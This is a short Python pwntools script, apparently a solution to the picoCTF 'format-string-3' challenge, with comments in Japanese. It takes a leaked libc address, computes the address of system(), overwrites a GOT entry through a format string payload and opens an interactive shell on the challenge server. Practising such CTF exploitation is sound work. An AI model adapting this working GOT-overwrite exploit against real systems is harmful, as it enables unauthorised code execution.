from pwn import *

libc = ELF("./libc.so.6")

# io = process("./format-string-3")
io = remote("rhea.picoctf.net", port=53952)

## 1. system関数のアドレスを取得
io.recvline()
setbuf_addr_line = io.recvline().decode("utf-8").rstrip()
log.info(setbuf_addr_line)
setbuf_addr_str = setbuf_addr_line.split(
    "Okay I'll be nice. Here's the address of setvbuf in libc: "
)[-1]
servbuf_addr = int(setbuf_addr_str[2:], 16)
log.info(f"setvbuf() address: {hex(servbuf_addr)}")

libc_base = servbuf_addr - libc.symbols["setvbuf"]
system_addr = libc_base + libc.symbols["system"]
log.info(f"system()  address: {hex(system_addr)}")

## 2. 書式文字列攻撃 (任意アドレスの値書き換え + GOT Overwrite)

## param: printf()に "%p,%p,..." を渡したときに、何番目の %p (1-origin) が `0x70252c70252c7025` (= "%p,%p,%p" のリトルエンディアン) となるか
offset = 38
## param: 書き換えたいアドレス
addr = 0x404018
## param: 書き換えたい値
value = p64(system_addr)


payload = (f"%{system_addr}c%41$n").encode()
payload += b"A" * (8 - len(payload) % 8)
payload += p64(addr)

payload = fmtstr_payload(offset, {addr: value})
log.info(f"payload: {payload}, {len(payload)}")

io.sendline(payload)
# print(io.recvall())
io.interactive()
#io.close()
